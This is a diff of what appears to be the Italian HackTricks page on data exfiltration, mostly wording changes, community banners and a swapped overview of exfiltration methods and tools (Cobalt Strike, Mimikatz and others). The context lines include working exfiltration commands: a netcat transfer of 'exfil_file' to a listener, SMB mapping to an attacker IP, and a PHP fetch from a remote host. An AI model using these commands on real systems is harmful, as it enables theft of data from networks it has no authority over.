@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
 
 Altri modi per supportare HackTricks:
 
@@ -14,11 +14,19 @@ Altri modi per supportare HackTricks:
 
 </details>
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 ## Domini comunemente autorizzati per esfiltrare informazioni
 
 Controlla [https://lots-project.com/](https://lots-project.com/) per trovare i domini comunemente autorizzati che possono essere abusati
 
-## Copia\&Incolla Base64
+## Copia e Incolla Base64
 
 **Linux**
 ```bash
@@ -177,35 +185,17 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Exfiltration
+# Esfiltrazione tramite Windows
 
-## Introduction
+Esistono molte tecniche per esfiltrare dati da un sistema Windows compromesso. Alcuni metodi comuni includono:
 
-When conducting a penetration test, it is often necessary to exfiltrate data from the target network. Exfiltration is the unauthorized transfer of data from a target system to an external location controlled by the attacker. This process is crucial for demonstrating the impact of a successful attack and the potential risks associated with it.
+1. **FTP**: Utilizzare un client FTP per trasferire i dati su un server controllato dall'attaccante.
+2. **Email**: Invio di dati sensibili come allegati via email.
+3. **Cloud Storage**: Utilizzare servizi di archiviazione cloud come Dropbox o Google Drive per caricare i dati.
+4. **Tunneling**: Creare un tunnel crittografato per trasferire i dati in modo sicuro.
+5. **Steganografia**: Nascondere i dati all'interno di file multimediali per evitare la rilevazione.
 
-## Techniques
-
-There are various techniques that can be used to exfiltrate data from a compromised system. Some common exfiltration techniques include:
-
-- **DNS Tunneling**: Using DNS requests to encode and transfer data outside the network.
-- **HTTP/S Traffic**: Sending data over HTTP or HTTPS protocols to external servers.
-- **FTP**: Transferring files using the File Transfer Protocol.
-- **Email**: Sending data as email attachments or through email messages.
-- **Steganography**: Hiding data within other files or images to avoid detection.
-- **Cloud Storage**: Uploading data to cloud storage services for retrieval later.
-
-## Tools
-
-Several tools are available to facilitate data exfiltration during a penetration test. Some popular tools include:
-
-- **Cobalt Strike**: A powerful penetration testing platform that includes features for data exfiltration.
-- **PowerShell Empire**: A post-exploitation framework that can be used for exfiltrating data.
-- **Mimikatz**: A tool for extracting credentials and other sensitive information from Windows systems.
-- **CrackMapExec**: A post-exploitation tool that can be used for lateral movement and data exfiltration.
-
-## Conclusion
-
-Exfiltrating data is a critical aspect of a penetration test, as it demonstrates the potential impact of a successful attack. By using various techniques and tools, testers can effectively showcase the risks associated with unauthorized data transfer and help organizations improve their security posture.
+È importante scegliere il metodo di esfiltrazione in base all'ambiente target e alle misure di sicurezza implementate.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -229,7 +219,9 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-Netcat è uno strumento versatile per l'invio e la ricezione di dati su una rete, ed è spesso utilizzato per l'esfiltrazione di dati durante un test di penetrazione. Può essere utilizzato per stabilire una connessione TCP o UDP con un server remoto per trasferire dati in modo rapido e efficiente. Netcat può essere utilizzato in combinazione con altri strumenti per esfiltrare dati in modo discreto e senza lasciare tracce evidenti.
+### Netcat
+
+Netcat is a versatile networking utility that can be used for reading from and writing to network connections using TCP or UDP. It can be used to transfer files, port scanning, banner grabbing, and as a backdoor. Netcat can be used to exfiltrate data by creating a connection to a remote server and sending the data over the network.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -276,7 +268,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Per impostazione predefinita in XP e 2003 (in altri sistemi operativi deve essere aggiunto esplicitamente durante l'installazione)
+Di default in XP e 2003 (in altri deve essere aggiunto esplicitamente durante l'installazione)
 
 In Kali, **avvia il server TFTP**:
 ```bash
@@ -302,7 +294,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-VBScript (Visual Basic Scripting Edition) è un linguaggio di scripting sviluppato da Microsoft che è spesso utilizzato per automatizzare attività all'interno di sistemi Windows. È possibile utilizzare VBScript per eseguire operazioni di esfiltrazione di dati, come ad esempio inviare informazioni sensibili a un server remoto.
+VBScript (Visual Basic Scripting Edition) è un linguaggio di scripting sviluppato da Microsoft che è spesso utilizzato per automatizzare attività all'interno di sistemi Windows. Può essere utilizzato per eseguire operazioni di esfiltrazione di dati, come l'invio di informazioni sensibili a un server remoto.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -355,6 +347,11 @@ Quindi copia-incolla il testo nella shell di Windows e verrà creato un file chi
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
@@ -362,11 +359,11 @@ Quindi copia-incolla il testo nella shell di Windows e verrà creato un file chi
 
 Altri modi per supportare HackTricks:
 
-* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
 
 </details>
 ```
